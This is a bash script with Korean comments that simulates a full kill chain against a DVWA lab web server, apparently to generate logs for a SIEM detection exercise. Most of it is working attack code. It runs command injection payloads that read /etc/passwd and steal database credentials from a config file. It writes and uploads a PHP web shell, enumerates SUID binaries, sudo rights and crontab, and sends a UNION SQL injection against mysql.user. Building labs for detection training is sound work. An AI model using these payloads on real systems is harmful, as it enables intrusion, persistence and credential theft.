#!/bin/bash
# =============================================================================
# Phase 5: Kill Chain Attack Simulation
# 목적: DVWA를 통한 실제 공격 시나리오 실행 및 로그 생성
# 실행 서버: Attacker (192.168.1.132) → Target: Web (192.168.1.131)
# =============================================================================

TARGET_WEB="192.168.1.131"
TARGET_DB="192.168.1.133"
DVWA_URL="http://${TARGET_WEB}/dvwa"

echo "=============================================="
echo " Phase 5: Kill Chain Attack Simulation"
echo " Attacker: $(hostname -I | awk '{print $1}')"
echo " Target Web: ${TARGET_WEB}"
echo " 시각: $(date '+%Y-%m-%d %H:%M:%S')"
echo "=============================================="

# ────────────────────────────────────────────────
# [1단계] Reconnaissance - 정찰
# ────────────────────────────────────────────────
echo ""
echo "════════════════════════════════════════"
echo " [STAGE 1] Reconnaissance (정찰)"
echo "════════════════════════════════════════"

echo "[*] 대상 웹 서버 포트 스캔..."
nmap -sV -p 80,443,22,3306,8080 ${TARGET_WEB} 2>/dev/null | grep -E "open|closed|filtered" | head -10

echo ""
echo "[*] Nginx 버전 정보 수집..."
curl -sI http://${TARGET_WEB}/dvwa/ 2>/dev/null | grep -E "Server:|X-Powered-By:"

echo ""
echo "[*] DVWA 로그인 페이지 확인..."
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://${TARGET_WEB}/dvwa/login.php)
echo "    DVWA 접근 HTTP 코드: ${HTTP_CODE}"

# ────────────────────────────────────────────────
# [2단계] Initial Access - DVWA 로그인 및 취약점 확인
# ────────────────────────────────────────────────
echo ""
echo "════════════════════════════════════════"
echo " [STAGE 2] Initial Access (초기 침투)"
echo "════════════════════════════════════════"

echo "[*] DVWA 로그인 시도 (기본 자격증명: admin/password)..."
COOKIE_FILE="/tmp/dvwa_cookie.txt"

# DVWA 쿠키 획득 (로그인)
LOGIN_RESULT=$(curl -s -c ${COOKIE_FILE} -b ${COOKIE_FILE} \
    -X POST "http://${TARGET_WEB}/dvwa/login.php" \
    -d "username=admin&password=password&Login=Login" \
    -L -o /dev/null -w "%{http_code}")
echo "    로그인 HTTP 응답: ${LOGIN_RESULT}"

# 보안 레벨 Low로 설정
curl -s -c ${COOKIE_FILE} -b ${COOKIE_FILE} \
    -X GET "http://${TARGET_WEB}/dvwa/security.php" -o /dev/null
curl -s -c ${COOKIE_FILE} -b ${COOKIE_FILE} \
    -X POST "http://${TARGET_WEB}/dvwa/security.php" \
    -d "security=low&seclev_submit=Submit" -o /dev/null
echo "    [OK] 보안 레벨 Low 설정"

# ────────────────────────────────────────────────
# [3단계] Command Injection 공격
# ────────────────────────────────────────────────
echo ""
echo "════════════════════════════════════════"
echo " [STAGE 3] Exploitation: Command Injection"
echo "════════════════════════════════════════"

echo "[*] Command Injection 취약점 익스플로잇..."
echo "    Target URL: ${DVWA_URL}/vulnerabilities/exec/"

# 기본 명령 주입 테스트
echo ""
echo "    [3-1] whoami 실행:"
RESULT=$(curl -s -c ${COOKIE_FILE} -b ${COOKIE_FILE} \
    "${DVWA_URL}/vulnerabilities/exec/" \
    -X POST \
    -d "ip=127.0.0.1%3Bwhoami&Submit=Submit" \
    --data-urlencode "user_token=" 2>/dev/null | \
    grep -A2 "pre" | grep -v "pre" | head -3)
echo "    결과: $RESULT"

echo ""
echo "    [3-2] id 명령어 실행:"
curl -s -c ${COOKIE_FILE} -b ${COOKIE_FILE} \
    "${DVWA_URL}/vulnerabilities/exec/" \
    -X POST \
    -d "ip=127.0.0.1%3Bid&Submit=Submit" 2>/dev/null | \
    grep -oP '(?<=<pre>).*?(?=</pre>)' | head -3

echo ""
echo "    [3-3] 시스템 정보 수집:"
curl -s -c ${COOKIE_FILE} -b ${COOKIE_FILE} \
    "${DVWA_URL}/vulnerabilities/exec/" \
    -X POST \
    -d "ip=127.0.0.1%3Buname+-a&Submit=Submit" 2>/dev/null | \
    grep -oP '(?<=<pre>).*?(?=</pre>)' | head -3

echo ""
echo "    [3-4] /etc/passwd 읽기:"
curl -s -c ${COOKIE_FILE} -b ${COOKIE_FILE} \
    "${DVWA_URL}/vulnerabilities/exec/" \
    -X POST \
    -d "ip=127.0.0.1%3Bcat+/etc/passwd&Submit=Submit" 2>/dev/null | \
    grep -oP '(?<=<pre>).*?(?=</pre>)' | grep root | head -3

# ────────────────────────────────────────────────
# [4단계] Web Shell 업로드 (File Upload 취약점)
# ────────────────────────────────────────────────
echo ""
echo "════════════════════════════════════════"
echo " [STAGE 4] Web Shell Upload"
echo "════════════════════════════════════════"

# PHP Web Shell 생성
WEBSHELL_CONTENT='<?php system($_GET["cmd"]); ?>'
echo "$WEBSHELL_CONTENT" > /tmp/shell.php

echo "[*] PHP 웹쉘 생성: /tmp/shell.php"
echo "    내용: ${WEBSHELL_CONTENT}"

# File Upload 취약점으로 웹쉘 업로드
echo ""
echo "[*] DVWA File Upload를 통한 웹쉘 업로드..."
UPLOAD_RESULT=$(curl -s -c ${COOKIE_FILE} -b ${COOKIE_FILE} \
    -X POST "${DVWA_URL}/vulnerabilities/upload/" \
    -F "uploaded=@/tmp/shell.php;type=image/jpeg" \
    -F "Upload=Upload" 2>/dev/null)

# 업로드 결과 파싱
UPLOAD_PATH=$(echo "$UPLOAD_RESULT" | grep -oP "hackable/uploads/[^'\"<>]+\.php" | head -1)
if [ -n "$UPLOAD_PATH" ]; then
    echo "    [SUCCESS] 웹쉘 업로드 성공!"
    echo "    경로: http://${TARGET_WEB}/dvwa/${UPLOAD_PATH}"
    SHELL_URL="http://${TARGET_WEB}/dvwa/${UPLOAD_PATH}"
    
    # 웹쉘 동작 확인
    echo ""
    echo "[*] 웹쉘 실행 테스트:"
    echo "    cmd=id:"
    curl -s "${SHELL_URL}?cmd=id" 2>/dev/null | head -3
    
    echo "    cmd=hostname:"
    curl -s "${SHELL_URL}?cmd=hostname" 2>/dev/null | head -2

    echo ""
    echo "[*] 웹쉘 경로 기록: ${SHELL_URL}" >> /tmp/attack_log.txt
else
    echo "    [INFO] 업로드 응답 확인 중..."
    echo "$UPLOAD_RESULT" | grep -E "success|error|uploaded|failed" | head -3
    # Command Injection으로 대체 시도
    echo ""
    echo "[*] Command Injection으로 웹쉘 드롭 시도..."
    curl -s -c ${COOKIE_FILE} -b ${COOKIE_FILE} \
        "${DVWA_URL}/vulnerabilities/exec/" \
        -X POST \
        -d "ip=127.0.0.1%3Becho+'<?php+system(\$_GET[cmd]);+?>'+>+/var/www/html/dvwa/hackable/uploads/shell.php&Submit=Submit" 2>/dev/null | head -3
    SHELL_URL="http://${TARGET_WEB}/dvwa/hackable/uploads/shell.php"
fi

# ────────────────────────────────────────────────
# [5단계] Privilege Escalation 준비
# ────────────────────────────────────────────────
echo ""
echo "════════════════════════════════════════"
echo " [STAGE 5] Privilege Escalation 준비"
echo "════════════════════════════════════════"

echo "[*] SUID 바이너리 탐색 (Command Injection)..."
curl -s -c ${COOKIE_FILE} -b ${COOKIE_FILE} \
    "${DVWA_URL}/vulnerabilities/exec/" \
    -X POST \
    -d "ip=127.0.0.1%3Bfind+/usr/bin+-perm+-4000+-type+f+2>/dev/null&Submit=Submit" 2>/dev/null | \
    grep -oP '(?<=<pre>)[^<]+' | grep "/" | head -10

echo ""
echo "[*] Sudo 권한 확인 시도..."
curl -s -c ${COOKIE_FILE} -b ${COOKIE_FILE} \
    "${DVWA_URL}/vulnerabilities/exec/" \
    -X POST \
    -d "ip=127.0.0.1%3Bsudo+-l+2>&1&Submit=Submit" 2>/dev/null | \
    grep -oP '(?<=<pre>)[^<]+' | head -5

echo ""
echo "[*] Crontab 확인..."
curl -s -c ${COOKIE_FILE} -b ${COOKIE_FILE} \
    "${DVWA_URL}/vulnerabilities/exec/" \
    -X POST \
    -d "ip=127.0.0.1%3Bcat+/etc/crontab&Submit=Submit" 2>/dev/null | \
    grep -oP '(?<=<pre>)[^<]+' | head -10

# ────────────────────────────────────────────────
# [6단계] Lateral Movement - DB 정보 탈취
# ────────────────────────────────────────────────
echo ""
echo "════════════════════════════════════════"
echo " [STAGE 6] Lateral Movement (내부 이동)"
echo "════════════════════════════════════════"

echo "[*] DVWA 설정 파일에서 DB 자격증명 탈취..."
curl -s -c ${COOKIE_FILE} -b ${COOKIE_FILE} \
    "${DVWA_URL}/vulnerabilities/exec/" \
    -X POST \
    -d "ip=127.0.0.1%3Bcat+/var/www/html/dvwa/config/config.inc.php&Submit=Submit" 2>/dev/null | \
    grep -oP '(?<=<pre>)[^<]+' | grep -E "db_|DB_|password|user" | head -10

echo ""
echo "[*] DB 서버 연결 테스트 (내부망 10.10.20.10)..."
curl -s -c ${COOKIE_FILE} -b ${COOKIE_FILE} \
    "${DVWA_URL}/vulnerabilities/exec/" \
    -X POST \
    -d "ip=127.0.0.1%3Bnc+-zv+-w3+10.10.20.10+3306+2>&1&Submit=Submit" 2>/dev/null | \
    grep -oP '(?<=<pre>)[^<]+' | head -5

echo ""
echo "[*] SQL Injection으로 DB 데이터 추출..."
# DVWA SQLi 취약점 악용
SQLI_RESULT=$(curl -s -c ${COOKIE_FILE} -b ${COOKIE_FILE} \
    "${DVWA_URL}/vulnerabilities/sqli/?id=1'+UNION+SELECT+user(),password+FROM+mysql.user--+&Submit=Submit" 2>/dev/null | \
    grep -oP '(?<=Surname: ).*?(?=<)' | head -5)
echo "    [SQLi 결과] DB 사용자 정보: ${SQLI_RESULT:-응답 파싱 필요}"

# ────────────────────────────────────────────────
# 공격 요약 리포트
# ────────────────────────────────────────────────
echo ""
echo "=============================================="
echo " Phase 5 Attack Simulation 완료"
echo " 시각: $(date '+%Y-%m-%d %H:%M:%S')"
echo "=============================================="
echo ""
echo " Kill Chain 단계별 실행 결과:"
echo "  1. Reconnaissance  : 포트 스캔, 배너 그래빙"
echo "  2. Initial Access  : DVWA 로그인 (기본 자격증명)"
echo "  3. Execution       : Command Injection (whoami, id, passwd)"
echo "  4. Persistence     : Web Shell 업로드"
echo "  5. Priv Escalation : SUID, sudo, crontab 탐색"
echo "  6. Lateral Move    : DB 자격증명 탈취, DB 연결 시도"
echo ""
echo " 위 공격 로그가 SIEM으로 전송됩니다."
echo " Kibana에서 다음 쿼리로 확인하세요:"
echo "  - log-nginx_access-*: tags: dvwa_attack_endpoint"
echo "  - log-auditd-*: tags: command_execution"
echo ""
